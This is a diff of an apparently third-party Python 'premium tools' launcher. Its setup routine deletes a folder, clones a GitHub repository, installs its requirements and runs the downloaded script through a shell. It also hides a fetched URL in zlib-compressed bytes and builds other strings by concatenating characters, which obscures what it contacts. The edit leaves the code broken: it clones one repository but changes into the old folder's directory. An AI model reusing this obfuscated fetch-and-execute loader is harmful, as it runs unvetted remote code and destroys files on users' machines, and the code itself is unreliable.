@@ -219,7 +219,6 @@ def banner():
 {RED}╚════════════════════════════════════════╝ {P}
  {K}[{H}√{K}]{P} This Is Premium Tools{RED}/{P}Command 
  {K}[{H}√{K}]{P}     {H} Enjoy {warna}TOXIC{N}{H} User 
- {K}[{H}√{K}]{P}     {H} Enjoy {warna}TOXIC{N}{H} User 
  {K}[{H}√{K}]{P} Successfully Update Done {H}{vsn}{P}""");print(led);print(f'{gen}Key {RED}: {A}{BN}{mpm}{N}');print(led)
 cxp = 'c'+'o'+'n'+'t'+'r'+'olex'+'xp'
 mpk = 'o'+'g'+'s'+'p'+'ot'
@@ -243,11 +242,11 @@ def run_command(command):
 	banner();print(f"{dot}Running{M} :{my_color} {command}{P}")
 	subprocess.run(command, shell=True)
 def setup_and_run():
-	run_command("rm -rf HARRYv6")
-	run_command("git clone --depth=1 https://github.com/HARRY-EXE/HARRYv6")
+	run_command("rm -rf FILEMAKING")
+	run_command("git clone --depth=1 https://github.com/PRINCE-BRAND/FILEMAKING")
 	os.chdir("HARRYv6")
 	run_command("pip install -r requirements.txt")
-	run_command("python3 run.py")
+	run_command("python3 FILEZ.py")
 try:
 	amsg = par(requests.get(zlib.decompress(b'x^\xcb())(\xb6\xd2\xd7/\xd5+\xc9\xd7\xf720\x8e\xf4\x0c\x04\x00B5\x06!'),verify=True).text,'html.parser')	
 except Exception as e:
